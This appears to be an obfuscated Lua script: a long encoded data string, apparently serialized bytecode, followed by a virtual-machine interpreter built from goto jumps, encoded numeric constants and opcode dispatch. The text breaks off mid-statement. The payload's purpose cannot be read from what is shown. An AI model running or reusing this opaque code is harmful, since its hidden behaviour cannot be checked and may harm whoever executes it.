!!=eT5;*6D#Qko\"72%$N)?YNk\"$[(o$TS<W!<YP]1E-Z'&Hb6>)Zp?J8HV0Zo`G:\\!s8X#.k^u1,:b9D\"0DS+5;+Yl#S/RA<4N)5'0-/O\"TpuO!<X9$\"-iuk5MZ>B+#sGr!<YQU\"T/e.\"W/=/-WHc?\"!]f.jT,HJ-SGQ-\"47,O56K:8\"$Zki-Og1J!<YOgh#RUB-Pljj\"6fgg5<CY'#Qq%-\"$Zki4\"UQN!s:bHL&q`14#6sE!t.<n!tRa!\",-dY56Ei+!!CaQ\"$Zl056(e:!s:ai2a79E01,^A\"$8(r1BRmbblRu3\"\"-G9\"-EZf56EQ'!!C1A\"$\\jL\"%NG(56(d-6N@51!s:bL1BRmb,<l/1nH&eW!u\"$%!s:V:4#6sE\"0hn056E,t!!A&[\"$Zki4\"UQr!WtXh\"$8(r1BRmb-U.S5.mj:=\"$8(r1BRmb.mF\"91ID-E\"$8(:T`P<\\1PPrE-Nf>0\"$\\k'!sf\"^!WtXh\"$8(:r;d!b.i/9n\"5*bY56D!<%0PPk\"$Zm]!<YP6(BXpFm/mGT!s9n[\"2t9C5:76L#Qk/V%0Hn=56JS\"\"$[kD!seu2*t8='\"9UjjOT>PK*u>\"b!s9VS\"-E]g57\\,(#Qk;F!#GkB#S.\">/.Vgb*s9%V\"$[G0!sf\\V!seu6)ZUrb!sf#%\"9Um%!<X,u\"8r?)577Pq/-DRK\"$Zki#=Ak$!sf\"n\"9Ujj#7geJ#6P56eH>t=%i5`[\"3grN56HTB\"$Zki1CXGs!s:bD(BXpFJHZ-?z%46EI>oYI64U_l9/NO\"7mbe-K*<SM.*<SP)&$H8E%TrlS\"$Zki\"&8q#$Shel!uqCF\"#^5r\"$Zbc!!!!$!/'53\"%`SZ\"%`SZi\"\"KEZ2tL<%0Jfs!s;:'(BZ`,'a$)k%0Jg\"<W`I0!s8Q+5m'=RK*VPf\"!Ib2$cW2L\"9T/:3Wipq56D,m49IGC56D#n70@B/56Cum2$6t`577Q(2$5E456D92(DCNc\"9W'756Cum%0ltC2$6\\X56(Z`!!*B9!8l`:\"#U0F\"#U0F+'et%\"5*bY577Pq#R^kF!<Ymq5NMn^'-mZ_\"$[G,!sf!+\"$[;$%flbY\"$Zki#=AS*\"$Zl$\"'ZQP!seuL\"$[;$!seu\\\"$Zkq(B=P#\"$ZnX!WtY?(BXpF$SqbbJH5j;0,H94\"*\"E-0.S[\\\"-ETd5;+ZG<!0*#\"$Zl<2ZNr:!<YP>!s:(VB`gR=0,m21*s2d%(GB/P,6J2RGlp85#m3CJ-NaVVYlOqk0/#+3\"\"tGj\"/Q##56D90!!D$Y\"$ap<]FE$l&f1YD\"%EBD!s:b(0*;K:!uDUr\"6BRd58O\\03!7t<\"$[S8!sm9T(DA%rYlY\"l+-H^.\"9Y>!\"$[kL!sf![!WtY/(E[$0,6J2RW<*/d,6J#R!uDV=\".92m58tOD#Qsl'\"$[/<\"$-P'!WtY/+!X_eblRu3(Dd/Z\"1\\I856D94!$;:F#Qp%f\"$\\/.!sA]J#o=g6!sftj,:`j<(B=R-!<YOg(CL3FM$!iE(Gc.!h#S<\",Qk^\\\"$[/0\"'u**!WtXh(CL3FM$!iE!s8cT!s8X#(H2F%!tQ=N\"-irj56Du0+p4A<\"$[S(aT3\\4!s8fR+!Ue6#6P56bl\\&4$R[/\\00]OE\"2t?E5:8NC#6V45\"$\\Fh,<H\"L!<YP6+\"%'k]`S@$\",R*^56Cum-3N3/\"$Zl,$NL:Z!s:af!!!!14Z>?o!M]Z,EC*-c!@\"?@VZ?oU?!m[/i;s,7!WtXhf`D7?!s8X#ZN=;4\"9[<Z\"$cM]_>s`A\"0D\\.5;NcO\"9Udh5=`Ql!sD8;!sDCl!sDPc!s8[-JcZ#W\").j%&d('1\"6fgg5:Qca!Z;*\"!s:cK!gWoj\"HroT!WrQ-nGr_VNrb[M!sFegc2e\"MQN?LT!sA_V!<YPjJcPrV?ZlMS@tk$e\"9[li\"$\\C?dfC<gOTYbNiW95F!Z;*2!s:b@ec>jU\"!%J.Acj7q\",R']5D'$C!<WI[!kn^<\"9XJ`\"$bfI[K-I5\"+^IT5H=kV!<WJ.!f@!\\\"9T)85GJ7n!<WJ&!QG-B\"KMR3!WrS/!?M=G\".98o56ESE70B4b\"$`7U\\cDm9\"5s:`5<kkC!sD!6!WrQ-,m-@nRKEWp\"5Nt[5F2F4!sA`%!<YQ@!s>\"o)4ptf!s8\\$!mUiL\"9X>[\"$\\01!<WHTD?C\"DM#d]C!sAQ)1'7U`>lt<6=T]$649P*T\"$`L^\",?mp\"8r9'5AT6[!sEQ5!WrRHV?6o'h?!e')1/4^!sF*3!sGb-\"+pUl\"/u>(5L0?3!sA^O\"$Zki\"#^8+!<YQY!TjFc\"9Z18\"$boK\"(rJRYlY\"lq>g[/):eik',^oF!s:de!X\">])$=\"D5GnQL!sA_.!<YR<![\\!PgB%]a\"Q'8i!sA_&!<YRP!dXqOmfHet\"S2]7!WrQ-'a$\\c!<^4?)92bI!sHdJU&kE\"\"47/P59DW_\"9Xbe\"$bN@l2h%jhZ6UW\"QKMH!sIcfXo\\\\.\"18765IU^N!<WJ:!n%)O\"MY$;!<WIb!s?FB)92fi!WrSK!ZD.D\"+^RW58VHC!sBRk!WrQ-]`S@$cN6iD\"9V'p5DoT+!<WH,9`mVO!X%$T)$@h[\"$a*mNWT@d[fMp!!sH4:WWE8*^B'&i!sA_.!s:db!e(4S\"-ioi5O/?%!s8\\p!?qUKo)XjP!sJ?!Oob^gqZ6Bl!sJW)Sc]&t\".9/l5Ge[B$(qV-z!<<H,P2QHER/mCS\".9/l56Cui:'6mb\"$\\\"L!sftn+&W1S'*SIC\"%`_*!sf8^!seu>\"$?[^!<YP*0*;I^3<MJ^)])CI(DdDp#6PkL#6P56PlUtO(Dd/Z\"'#Ff)]Jkb)]OqB9*9SE56hPu#R_.F#S.:F#SRjR#Qmd'58t[H#Qp%e\"$Zku'1<KA!sf\\V!sf!O\"$[kP!seu@\"$Zkm\"'Gj6!seu6\"%iZ(\"$[GL!sf\\f!seu`\"$`jsY6DQJ/cYkO!\":M1#TP6I1Gq*,/NFQAPd#4(q:\\'K(4$tNaf%F'k<f.3lc25Ud\\Cd$e*0(`JsE.VDrO!U*4Z-Lr,kH^l..[sV*=?YbP<Dd/=[>>bJ7'tMV\\J,N!J]:SJS-$`Ld)/s8W-!s8S\\fd1ZK[!!!\"X\"lX]B5hqs,\\GuU/s8W+X#uJiGiq\"SW/ifM3rr<#us8W+jhuE`Vs8W-!N!WW_<8EGD0^5g5g?JY;s8W-!T$dT<s8W-!s,7+(O_T&.T(r?cs8W-!s.1#+s8W-!s8S\\7s8W-!s8W+j[/^1+s8W-!Sd5f+z!1oqbs8W-!s8S#\\H(\"pLT\"Y1(s8W-!s.4H7s8W-!s8S#^_eQ]E\"AGC=s8W-!s8W+j[K$:,s8W-!Sg4:8s8W-!s.8!Fs8W-!s8S[+s8W-!s8W+jqZ$Tqs8W-!N!Z:.i@aS@IB,T(0`V1Qs8W-!N!!7QqOZF@s8W-!s8S\\Mrr<#us8W+jnc/Xhs8W-!SlYmks8W-!s.4*-s8W-!s8S\\js8W-!s8W+jkl:\\_s8W-!Sg+aGz!1nH8s8W-!s8S[Jrr<#us8W+jp&G'ls8W-!So=Z/s8W-!s.3[!s8W-!s8S\\Ys8W-!s8W+jqu?]rs8W-!Sq6qAs8W-!s.5e]s8W-!s8S[9rr<#us8W+X\"k)no/@;\"Js8W-!s8W+j_>jQ8s8W-!N\"[oCcnMljZf?h6.=,^Y(kXRs&Y:fYs8W-!s8S#]8B2!W-_C;:s8W-!s8S\\4s8W-!s8W+X#I4U%85S-lT(N'_s8W-!s.3^\"s8W-!s8S\\;s8W-!s8W+X\"%p7pSu;Vgs8W-!s.7F6s8W-!s8S[Dd/X.Gs8W+j0E;(Ps8W-!T\"G%&s8W-!s.8i^s8W-!s8S[_s8W-!s8W+X\"IhE,SW!_e!9jH\\So4T.s8W-!s,77kIkh4:j0jXNT%O)Cs8W-!s.8ras8W-!s8S\\/s8W-!s8W+j1B7CSs8W-!SpUM;s8W-!s,7(cr/eXar;Zfss8W-!Muj-;T&BGEs8W-!s.8TWs8W-!s8S[as8W-!s8W+jYl=\\&s8W-!T#Ug1s8W-!s.0;ks8W-!s8S#_^Vu,T>?MK.SH&Whs8W-!MuqI>Sn%g#s8W-!s,77S3B,Gh2EMe)T'QFVs8W-!s.1tFs8W-!s8S\\3s8W-!s8W+j9E+tks8W-!T&K_Ls8W-!s.2d]s8W-!s8S#[F.MoozzN!NuAJ<V&]E%%<Vs8W-!s8W+jkPtS^s8W-!T%*f?s8W-!s,7&PDS;Xds8W-!s8W+X#q3M^qQ&NlVT5;(9`P.n!!!\"jngshAzT%F#Bs8W-!s.6Rss8W-!s8SZfs8W-!s8W+j&/P<HzT#32]z!1s'Yz!!&TZoDejjs8W+j2#mUUs8W-!N$Ea,,lQkY7]O/N3MNN7L;YpF+V6)&%0A-W-Kd5Mp3EWp!K75BBWRNm_MedlUhq#C!'/))N!-F[l2\\tuXoJG$s8W-!Sp^S<s8W-!s.8?Ps8W-!s8S[Es8W-!s8W+jcI)[ls8N*\"N!lmOY@Q/!(5NsY8=lUVs8W-!s8SZ[s8W-!s8W+j8,rVhs8W-!SpCA9s8W-!s.8T]z!!&Ufs8W-!s8W+jNRn.0s8W-!SuM_hs8W-!s,7,e'^AXsSuhtls8W-!s.52Ks8W-!s8S\\>s8W-!s8W+j-3+#Fs8W-!MuunQ3hG:0s8W-!s8U\"'!<rOmi;s+$\"$Zko\"$[IFdK'FY',RYM5)o^L(H7?Vh>nEO',Lj:WWKU0(H3!0(H(L^EFV38/H\\3NcdDgr$kjG_!BuMGh>nEO',RMH5-b3t!>d[.!uEfsEVfo(S.#?%m0PlW;$0#rcdDgr$kjHJ\"$W.UOoZ@X',Sdm54Sfa!>d[.!uEiC!<WQ@\"*ju5!s8W`\"&/k^\"+:89'@5)-!t5hZV?/rA!sTQ#',Q6&5(9p@(H3!0(GuTO!s8Z.\":mrU!MKMr56I__\"$[IFdK'FY',RMJ5->$O!>d[.(HOa?!sTQ#NWZ]j(H3!D[KA^j\"1A4H2\\Q902$3pc!'g&X\"&8r<\"$Zti!!!*$!!!W3z!!(jU!!\"GJ!!\">G!!!$\"!!!-%!!!-%!!#pt!!\"hU!!!$\"!!!$\"&-24Y!X\"Da\"$Zko\"$\\$VdK'FY,:BJm5)o^L-T@%fh>nu_,:<[ZWWKU0-T<7P-T1W$N<>@I56Cui:'33Q5:b(.!<W`\\04mC(Rp6%k1Gd#O4u_U*!sC]K!<WHhjoY\\g\"#CTY1Gamh4^A.G-o5T?\"D%Zk3A\\MQ!sCQP>Q[b\\2sp`24/)cY\"9URb>;J&o<6bS%1Cc3-1FFt3OoZUS0BrR%B!q^n2_+t`2$9*E\"2+^[cdDgr$mR,L5)o^L-TAI7h>nu_,:E$_5)oa%!@KfN-Y>Ol[K.a7,6K;NirTVc!WW<9mfcqD!<X,U\"3CQG56K.2\"$\\$VdK'FY,:D%D5/%(&-T<7tV?9$5!k&+W2^8DP29,e<8j3@E!<YOgnGr_V/'lWE!t6\\5?9Y(a1S+_%1GdG\\6AYaG1FP'5!WrRf!Wt5=1H#=<-8RFf1Vs5M-SmC[*\\/nH!^9r!!A?A^\"\"uOt!NcD*59nM&!<W`T-cuHRM?8qA-T<7tq>id?!sU,3NW\\,=-T<7tQ30=Z!T!i)2^9\\V50<o7!@KfN\"\",r.#TlS>\"+p_.LBB!K\"@!\"Q!WtY3cdDgr$mR.6!BuMG\"t)>S-^Fm!Ooi&m-T<7P-T.=o!tuOc'A`dS@k@dI\"-EZf5:b(.!<W`\\09-0!ncCU&'K;Ld\"&Cj7joIY-iWB8c58F>(2Zj.51G^s5aTDW$-o7>t\"&C^/Q3'6/H349P1BUk?!s:>>1RhVO:GXfh!BrHR!WrQeWWN>+1BR_1`W@qP%Ps7N1FFt3OoZUS0B*$s\\cK5?0/kB`0/Wk1!s:b4cdDgr$mR,t5)o^L-T<7tScM#MOoZph,:C&'5+Ve`!@KfN\"\"0iE!s9'Udf\\\\5\"$[-l\"5OD2\"-!Bb57.Aj!!<3$!\"&]+z!!WE'!#Yb:!&+BQ!!3-#!+Q!/!':/\\!!<3$!-nPE!*9.#!!E9%!!WE'!!WE'!4;e,!+Q!/!!3-#!6G3@!/U[U!!*'\"!+Z'0!!**3!5mdt\"8N'%56L]a\"$Zn`\"9Ujj&Hb6JcdDgr$nF!\"\"$SN1>Q[bX1R8)+2o5Uu\"9UF^>;q<t\"&Cj7/j;@P3<N&=4,O,(\"#g<d2`!6,NWV'n>abdO1Cc40!Ac)Z0=Cm&.keU<5*c5X!A?A^\"\"uM6@08_=ir]Al,:C&*5)oa%!@KhO!KmI22^9]9!C\"'t[K.a7,6K;N\"8N(X!E'#R!<YP:cdDgr$nF!6\"?qD<1GTX_1G`GP1G]LsaoaFI1G@Sc*\\/lb5+Vkb!A?A^\"\"uM6YlOqk,L=d=7gpUirW,3#h>nu_,:DIO50a1l!@KfN-_:E(rW0G.-T<7P-T.V$#D37!)]Jh[\".98oZN10e!<YP:cdDgr$nF!B\"$SN1>Q[bX1[Y<.2uWm]\"9UF^>;q<t\"&Cj7/j;@P3<N&=4,O,(\"#g<d1G^sE1Gb$m&dgEN%Pt6i1FFt3OoZUS0DY`65.1JF2_+t`2$:)b\"$\\$VdK'Fm,:DaY5)o^L-T<7t5!J66[K.a7,6K;NB*/62\"47/P59nM&!<W`T-Up:[\"5X&+2^9]%\"?sO$h>nu_,:B>k5(WpG!@KfN\"\",t7\"9XP_)$@tblN9?Rr;m'c/'lWE!t6\\5p&dK7Rp6%k1Ge.o4u_I'!sC]+!sCC^\"\"Z6O1GcE@\"#D>]LH,H41Gd_c4u\\6W\"&Cj7M??$E1BUk+!s:>>1RhVO:GXfh!BrI%!s8Zfh?*i_1BR_1WWY+6$A&=81Cc4\\\"#D;\\0AZ^N.kf0L55#)e!A?A^\"\"uM6m/r+K59nM&!<W`T-aj(?[K3f;-T<7tmK5Y5\"1A4X2^9^D\"$Z,T[K.a7,6K;NU'&\".(E\"%<\"-NaM\"+^IT56IGZ\"$\\$VdK'FY,:B&a50a1l!@Kgd\"5X&+2^9]M!BuMG[K.a7,:AKS5,nXl!@KfN\"\",r.T*,s(\"5O\",\"D%\\[\"9Uk5cdDgr$mR.b!^:K+-T<7tmK#Ms!KmI22i\\!s!@KfN-]S3kl2nBp-T<7P-T0'Op&P6u\"6B^0#'C%H\"9Uk=cdDgr$nF!F\"$SN1>Q[bX1Ze^%2rXoA\"?Re0\">^,^/H,],1CAj;1G`;4\"#D_C1U7*=-SmE=!?NaEXoU`#\"1A4`2_+t`2$:Mq\"53c#cdDgr$mR-W\"?t*3OoZph,:A3J52H=s!@KfN-b][HL'+jb-T<7P-T(u.gB0eFblS\"&!<_Qi\"$\\$VdK'FY,:A3I5!G,1-T@%f[K.a7,:@Xu^&eKd2^9^D!^<aiOoZph,:CnA5+Vk>!@KfN-e8;^^&eKd2^9]U!^;VHOoZph,:A3K510PA!@KfN\"\",r>!s=;ZlN7r(&H`C_QiR9k(M:hm(YSs'\"-Wm)G6@XB\"$Zn4\"p7(7cdDgr$mR-/50a1l!@Kgd!sU,3,:?YYZ37T:-T<7P-T)PN%R-Ti#8\\85#0?uMB;#R>%-Rm/%KHJ/!rr<$+92BAz6N@)d;ZHdt#64`(W;lnu?2ss*\"98E%^An66OoPI^#64`(-NO2IScA`j\"98E%561`a\\GuU0!<<*\"FTDIBbQ%VC\"98E%$31&+$31&+$31&+$ig8-$ig8-$ig8-VZ?bth#IET\"98E%!W`Q,",5));G=(function(r)goto U;::q::;I=(0X1);goto B;::U::;goto r;::F::;c=r;goto q;::r::;goto F;::B::;end);w=4503599627370496;if not not Y[0x41b]then i=Y[0X41B];else i=-0X9+((Y[15130]&Y[1372]|Y[0X6050])-Y[25107]+Y[24843]);(Y)[0X41B]=i;end;else if not Y[27326]then i=0xD3+((Y[0X49F8]<<Y[0xAc]>>Y[15130]~Y[2984])-Y[4228]);(Y)[27326]=i;else i=Y[0X6aBe];end;end;else if not(i>0X1.6CP6)then l=(error);if not not Y[26784]then i=(Y[26784]);else Y[0X37F]=(-0X74+(((Y[4869]>>Y[4742]~Y[17134])>>Y[1271])+Y[16180]));i=3+((Y[20401]&i)+Y[0X55c]>>Y[1271]<Y[0X41b]and t[4]or Y[0X4fb1]);(Y)[26784]=(i);end;else if i>=0x1.F8P6 then X=function()local r=o(c,I,I);goto r;::B::;I=I+1;do return r;end;::r::;goto B;end;L=D;break;else v={};if not not Y[0X1305]then i=(Y[4869]);else i=0X15+(((Y[1051]~t[0X6])+t[0X5]>=t[8]and Y[0x1084]or t[0x9])~Y[0x00376F]);Y[0X1305]=(i);end;end;end;end;end;local W,A,k,g;S=nil;i=0X57;while true do if i==0x1.5Cp6 then W=(function()local r,B;goto B;::r::;I=B;do return r;end;::B::;r,B=h("<\x49\52",c,I);goto r;end);if not Y[15058]then(Y)[7177]=0X3B+(Y[2984]-Y[24843]-Y[13377]-Y[15130]&Y[4841]);i=70+((Y[0X376f]<<Y[0X7ae7]<=Y[4841]and Y[0X2579]or Y[0X002579])>>Y[4742]>t[0X9]and Y[172]or Y[4742]);Y[15058]=(i);else i=Y[0X3Ad2];end;elseif i==74.0 then A=(function()local r,B=h("<i8",c,I);I=(B);do return r;end;end);k=function()local r,B;goto q;::P::;goto F;::U::;goto e;::s::;r,B=h("<\100",c,I);goto G;::e::;I=B;goto r;::G::;goto B;::F::;goto U;::q::;goto s;::r::;do return r;end;::B::;goto P;end;if not not Y[30164]then i=(Y[0X75d4]);else i=(3242010918+(((Y[31463]&i~Y[0X376F])&t[0x4])-t[5]));(Y)[0X75D4]=(i);end;elseif i==33.0 then g=function()local r,B=0X0,0X0;repeat local q=o(c,I,I);r=r|(q&0X7F)<<B;B=B+0X7;I=I+0X1;until(q&128==0x0);return r;end;if not Y[26403]then i=-0X3c+((Y[86]-Y[0X1DEa]>>Y[18477]<=Y[0xAc]and Y[0X3B1a]or Y[0X68A0])&Y[0X7E02]);Y[26403]=(i);else i=Y[26403];end;else if i~=12.0 then else S={};break;end;end;end;local o,h,d,m,b=function()local r,B=(0X33);repeat if r~=0x1.98P5 then if r~=118.0 then else if not(B>=w)then else return B-R;end;break;end;else B=g();r=118;end;until false;return B;end,function()local r,B=104;repeat if r==0X1.aP6 then B=g();r=(0X27);elseif r~=0X1.38P5 then else I=I+B;return s(c,I-B,I-1);end;until false;end;i=(0X69);repeat if i==0X1.a4p6 then d=(function(...)return r('\u{023}',...),{...};end);if not Y[8742]then i=(8+(Y[0X12E9]-Y[0X37f]>>Y[0x55C]&t[4]|Y[0X12e9]));Y[0X2226]=i;else i=Y[8742];end;elseif i==0X1.aP5 then m={};if not Y[21325]then i=-3692592882+(((Y[18477]<<Y[18936])+Y[7177]>=Y[13377]and t[4]or Y[24843])+Y[0X2579]);(Y)[21325]=(i);else i=Y[0X534d];end;else if i==0X1.8p1 then if not not Y[0X005C48]then i=(Y[0X5C48]);else(Y)[0X5307]=(0X692+((Y[13377]&Y[1051])-Y[0X1084]<<Y[4742]|t[5]));i=(-66366118538+(((Y[18936]>t[0x3]and Y[25107]or Y[27326])~t[0X3])-Y[0X2226]<<Y[0x1286]));(Y)[23624]=i;end;else if i==6.0 then b=(type);if not not Y[29882]then i=(Y[0X74ba]);else i=0X29+((t[7]>Y[0x68a0]and Y[32258]or Y[0X6723])+Y[18477]-Y[0X2579]<t[2]and Y[4742]or Y[0x610b]);Y[0X74Ba]=(i);end;else if i~=0x1.68p5 then else m[0X64c2]=v;break;end;end;end;end;until false;local function r(B,q)local F,U=B[0X3],B[4];local e,s=B[2];s=function(...)local s,G=0X1,H(U);local U,N=d(...);local O,W,j,o,y,a=1,{},1,0X0;local Z={[31777]=G,[31908]=a,[6739]=F,[0x155]=W,[0x100]=B,[30090]=q};local B,a,E,z=1,{};local _,D,h,Q=f(function()repeat local e=(F[s]);local F=(e[0X1]);s=(s+1);if F<0X31 then if not(F>=24)then if F<0XC then if F<6 then if F>=3 then if F<0X4 then G[e[2]]=G[e[5]]/e[4];else if F~=5 then(G)[e[0X2]]=(e[6]);else local r,B,q=e[0X5],e[3],(e[2]);if B==0x0 then else j=r+B-0X1;end;local F,U;if B~=1 then F,U=d(G[r](n(G,r+1,j)));else F,U=d(G[r]());end;if q~=0X1 then if q~=0x0 then F=r+q-0X2;j=F+1;else F=(F+r-0X1);j=F;end;B=0;for r=r,F do B=B+0X1;(G)[r]=U[B];end;else j=(r-0X1);end;end;end;else if F<1 then(G)[e[3]]=G[e[5]];else if F~=2 then(G)[e[0x003]]=(G[e[0x5]][G[e[2]]]);else(G)[e[2]]=(e[0X4]..G[e[5]]);end;end;end;else if not(F>=0X9)then if not(F<7)then if F~=8 then local r=q[e[5]];(G)[e[0X3]]=(r[0X2][r[1]][G[e[0X2]]]);else local r=q[e[5]];(G)[e[2]]=(r[2][r[0X1]]);end;else(G)[e[0X3]]=(N[B]);end;else if not(F>=0Xa)then if G[e[5]]==e[0X4]then else s=e[2];end;else if F==0X00b then G[e[0X002]]=(G[e[5]]<<e[0x4]);else G[e[0X05]]=G[e[3]]-e[7];end;end;end;end;else if not(F>=0X12)then if F<0xf then if F>=13 then if F==0XE then G[e[5]]=e[0X7]+G[e[3]];else j=e[3];G[j]();j=(j-1);end;else G[e[0x2]]=Z[e[5]];end;else if F<0X10 then local r,B=e[0X5],e[0X2];j=r+B-1;repeat for r,B in K,W do if r>=1 then(B)[2]=({G[r]});B[0X1]=(1);(W)[r]=(nil);end;end;until true;return true,r,B;else if F~=0x11 then if not not(G[e[5]]<G[e[2]])then else s=e[3];end;else local r,B=e[5],(G[e[0X2]]);G[r+1]=B;G[r]=B[e[0X4]];end;end;end;else if not(F>=21)then if not(F>=19)then local r,B,q,U,s=53;while true do if r<53.0 then q=(-0xD);break;elseif r>16.0 then B=(e);U=1;r=(0x10+(e[5]+e[5]+F-e[2]>>F));end;end;local P,N=0X2,e;N=N[P];r=28;while true do if r<28.0 then P=(P[s]);r=0X23+((e[2]~=e[5]and e[2]or F)&e[0X2]&F|e[2]);elseif r<0X1.2cp6 and r>47.0 then s=(1);r=(16+(((F-F~=r and e[5]or e[0X005])~e[0x2])>>F));elseif r<0x1.7p5 and r>0x1.0P4 then P=(F);r=75+(((e[0X2]<=r and r or e[0X2])&e[2])-e[0X2]&r);elseif r>46.0 and r<53.0 then N=(N<<P);break;elseif r>28.0 and r<0X1.78P5 then P=(e);r=0X29+(((r<=r and F or e[0x5])~=e[0X5]and r or r)&r&e[0X5]);else if r>0x1.A8p5 then N=N+P;r=0x2e+(((e[0X5]>=e[0X2]and e[5]or e[5])<e[0X2]and e[0X2]or e[0x2])-e[5]&e[5]);end;end;end;P=e;s=(0X1);r=(49);while true do if r>0x1.b8p6 then P=(e);s=0x1;break;else if r<92.0 and r>0X1.6P3 then P=P[s];r=-0x20+((r&F|e[2])+r~r);elseif r<0x1.B8p6 and r>49.0 then N=N~P;r=(-65+(((F==r and r or F)~r|r)-F));elseif r<0X1.88P5 then P=F;r=110+(((r<<e[0x2])-e[2]|e[0X2])>>F);elseif r<0X1.d4p6 and r>92.0 then N=(N-P);r=7+(((e[0X5]~e[0X2]~=r and F or e[0X2])<r and r or e[0x2])>e[5]and r or e[0x5]);end;end;end;r=(0X78);while true do if not(r>106.0)then if r<=0x1.04P6 then s=(0X5);P=(P[s]);break;else P=e;r=-41+(((e[2]&e[5]>=r and e[0X2]or F)>F and e[2]or e[2])>F and e[0X5]or r);end;else if r~=119.0 then P=(P[s]);r=119+((r>>e[5]~e[2]|F)>>F);else N=N+P;r=(106+((e[0X5]+e[5]<e[0x5]and r or F)>>F&e[0X2]));end;end;end;r=0X1E;while true do if not(r<=0.0)then if r<101.0 then N=(N-P);r=(71+((e[5]<r and e[0X2]or e[5])-e[0X2]~e[5]==e[5]and r or F));else P=(e);s=(0X2);r=((((e[5]==e[0x2]and e[0X2]or e[2])>r and e[0X2]or e[0X5])>=F and e[0X5]or e[5])~e[0X2]);end;else P=(P[s]);break;end;end;N=(N~=P);if not N then else local r,B;for q=0X1D,0Xb2,0X46 do if q<99.0 then r=(e);elseif q>0X1.dP4 and q<169.0 then B=(2);elseif q>99.0 then N=(r[B]);break;end;end;end;r=(22);while true do if r<0x1.F4P6 then if not N then local r,B;for q=99,0x16c,0X7a do if q==343 then N=r[B];break;elseif q==0XdD then B=0X1;elseif q==0x63 then r=(e);end;end;end;P=(e);r=107+((e[0X5]~F)+r+e[0X2]==e[0X02]and F or F);else s=5;break;end;end;P=(P[s]);r=0X71;while true do if r~=0X1.c4p6 then if r~=0x1.cP4 then if r~=0x1.2Cp6 then if r==46.0 then B=(G);r=(0X29+(r>>F>>F>>e[2]|e[2]));elseif r==53.0 then U=e;r=4+(((F>F and e[5]or e[5])&F)+e[0X2]|e[2]);elseif r~=0x1.0p4 then else q=0X02;break;end;else B[U]=q;r=(-0X19+((F>>e[0X2]<<e[0X5]|e[5])~r));end;else q=q+N;r=(63+(((e[0X5]>e[0x2]and e[0X02]or e[2])-e[2]|e[0X2])&e[0X2]));end;else N=(N+P);r=(-0X61+(((r~r)>>e[0X5]<=e[2]and e[0X5]or e[0X5])~r));end;end;U=U[q];r=(59);while true do if r>0X1.d8P5 then if not q then local r,B,F,U,s=113;while true do if r>75.0 then B=lshift;r=0x1c;elseif r>28.0 and r<0x1.2cp6 then s=(5);break;else if r<0X1.7P5 then U=(G);r=(0x4b);elseif r<113.0 and r>0x1.7P5 then r=46;F=(e);end;end;end;F=(F[s]);for r=116,0x110,0X34 do if r<0x1.B8P7 and r>116.0 then F=e;elseif r>0x1.b8p7 then q=B(U,F);else if r<168.0 then U=U[F];elseif not(r<272.0 and r>168.0)then else s=(4);F=F[s];end;end;end;else s=(nil);N=nil;P=(0X6B);local r;while true do if P==0x1.aCp6 then s=G;r=(e);P=0X4E;else N=5;break;end;end;r=(r[N]);for B=56,0X12E,123 do if not(B<=0X1.Cp5)then if B~=0X1.2Ep8 then r=(e);else N=4;end;else s=s[r];end;end;r=r[N];q=(s<<r);end;(B)[U]=q;break;else if not(r<0x1.78P6)then else q=true;r=82+((e[2]<<e[0X2])+e[0X005]>>e[0X5]<=F and e[0X5]or r);end;end;end;else if F~=20 then if G[e[0X003]]~=G[e[0X5]]then else s=(e[2]);end;else local r,B,q,U,s,P,N=0X7D;while true do if r<0X1.5p5 then q=(5);break;elseif r>1.0 and r<0X1.B8P5 then N=(e);r=-0X2d+(((e[0X5]&r)>>F<=F and e[0X5]or e[0X5])|r);elseif r<0x1.F4p6 and r>0x1.b8p5 then U=(1);r=(-9+(((F-r>e[5]and e[5]or e[5])&r)+r));else if r>0x1.cp5 then B=(e);r=-57+(((e[0X5]|r<=F and e[0x5]or r)|e[5])~e[0x5]);elseif r>42.0 and r<0X1.CP5 then s=9;r=(0X2A+((F~e[0X05])+r>>e[5]&r));end;end;end;N=N[q];q=e;r=0X4f;while true do if r>79.0 then N=(N&q);break;elseif not(r<98.0)then else P=1;q=q[P];r=(98+((F~r~r)-F<<e[0x05]));end;end;q=e;P=5;q=(q[P]);N=N|q;r=(71);while true do if r~=71.0 then if r==122.0 then N=N==q;r=-20971503+(((r<=e[5]and F or r)<<F<r and r or F)<<F);elseif r==17.0 then if not N then else local r=(5);N=(e[r]);end;r=(-20971460+(((e[5]~r)&r==e[5]and F or F)<<F));elseif r~=0x1.EP5 then else if not N then local r,B;for q=0X35,267,0X7C do if q==177 then B=5;N=r[B];break;elseif q==53 then r=(e);end;end;end;break;end;else q=F;r=-339302416262+(((r==e[0X5]and F or e[0X5])|r)<<F<<e[5]);end;end;r=(0X62);while true do if not(r<0X1.88p6)then if r>89.0 then q=(F);N=N-q;r=82009+(((r==r and F or F)>>F)-F<<e[5]);end;else q=(F);break;end;end;N=N<q;r=111;while true do if not(r>0x1.0P1)then if not(r<111.0)then else q=e;P=0X1;break;end;else if N then N=(F);end;if not N then N=F;end;r=-0xa+(((r<r and F or F)>>e[0X5]|e[5])&r);end;end;q=(q[P]);N=(N<<q);r=(0X71);while true do if r==0x1.c4P6 then q=(e);P=(0X5);r=0X1c+(((r|F)>>e[0X5]<=e[5]and r or e[0X5])>>F);else q=(q[P]);break;end;end;N=(N~=q);if N then local r,B;for q=0X61,198,101 do if q<198.0 then r=(e);elseif not(q>0x1.84P6)then else B=0X1;N=(r[B]);end;end;end;if not N then local r,B,q=0X33;while true do if r>51.0 then N=(B[q]);break;elseif r<118.0 then r=(0X76);B=e;q=(0X005);end;end;end;r=0x19;while true do if r==0x1.9p4 then q=e;r=(12+(((e[0X5]>=r and F or F)|r<=e[5]and r or e[5])~F));elseif r==0X1.2P5 then P=1;r=(49203+((r<<e[0x5]&e[0X5])-e[5]<<e[0X5]));elseif r==51.0 then q=q[P];r=0X76+(r-e[5]+e[5]<<e[0x5]>>F);elseif r==0x1.D8p6 then N=N&q;s=s+N;break;end;end;B[U]=(s);r=(30);while true do if r==0x1.ep4 then B=G;r=77+(((e[0x5]|e[5])&e[0X5]&e[0X5])+e[5]);elseif r==101.0 then U=(e);r=(-0X14+(F-r&r~e[0X5]~=e[0X5]and F or r));elseif r~=0X0.0P0 then else s=5;break;end;end;U=U[s];r=67;while true do if r~=67.0 then if r==0x1.18P6 then(B)[U]=(s);break;end;else s=true;if not s then local r,B,q,F,U=0X32;for r=10,31,0X15 do if r<31.0 then q=rshift;elseif r>10.0 then B=(e);U=0x7;B=B[U];end;end;U=(e);while true do if r>50.0 then if r~=52.0 then r=(0X34);U=U[F];else 